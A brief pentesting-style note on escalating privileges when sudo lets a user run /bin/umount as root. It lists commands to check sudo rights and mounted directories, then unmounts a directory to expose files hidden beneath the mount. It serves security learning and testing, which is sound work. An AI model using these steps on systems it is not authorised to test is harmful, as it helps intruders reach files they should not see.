---
title: Sudo Umount Privilege Escalation
description: Sudo umount is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
date: 2023-02-15
draft: false
---

## Investigation

```bash
sudo -l

(root) NOPASSWD: /bin/umount
```

If we can execute umount command as root, we can escalate to privilege.

<br />

## Exploitation

In target machine, check what directory is mounted.

```bash
cat /etc/fstab
showmount -e localhost
```

Assume the **`/opt/example`** folder is mounted.  
If we unmount this folder, original files, that existed before the directory is mounted, may appear.

```bash
sudo /bin/umount /opt/example
ls -al /opt/example
```
